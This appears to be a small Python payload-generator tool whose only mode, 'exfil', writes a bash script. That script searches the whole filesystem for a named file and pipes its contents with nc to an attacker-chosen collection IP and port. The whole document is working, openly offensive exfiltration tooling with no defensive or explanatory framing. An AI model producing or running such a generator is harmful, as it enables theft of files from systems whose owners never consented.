import argparse

def main():
    parser = argparse.ArgumentParser(description='Generates payload for desired architecture.')

    #Required arguments
    parser.add_argument('-p', type=str,  default=None, help='Desired Payload: exfil', dest='payloadChoice', required=True)
    parser.add_argument('-f', type=str,  default=None, help='File you wish to exfil', dest='exfilFile', required=True)
    parser.add_argument('-i', type=str,  default=None, help='collection ip address', dest='collectionIP', required=True)
    parser.add_argument('-r', type=str,  default=None, help='collection port', dest='collectionPort', required=True)
    parser.add_argument('-a', type=str,  default=None, help='Target architecture: ubuntux86', dest='targetArch', required=True)

    #Optional arguments
    parser.add_argument('-o', type=str,  default="execute-command.sh", help='Payload output name', dest='payloadName', required=False)

    args = parser.parse_args()

    if(args.payloadChoice == "exfil" ):
        GenExfil(args.exfilFile, args.collectionIP, args.collectionPort, args.payloadName)
        print("Exfil Payload Generated! \n")

    return

def GenExfil(exfilFile, collectionIP, collectionPort, payloadName):
    ExfilPayloadText = "#!/bin/bash \n"
    ExfilPayloadText += "EXFILPATH=$(find / -name '" + exfilFile + "' | grep " + exfilFile + ")\n"
    ExfilPayloadText += "nc " + collectionIP + " " + collectionPort + " < $EXFILPATH \n"
    f = open(payloadName, "w")
    f.write(ExfilPayloadText)
    f.close()
    return

if __name__ == "__main__":
    main()
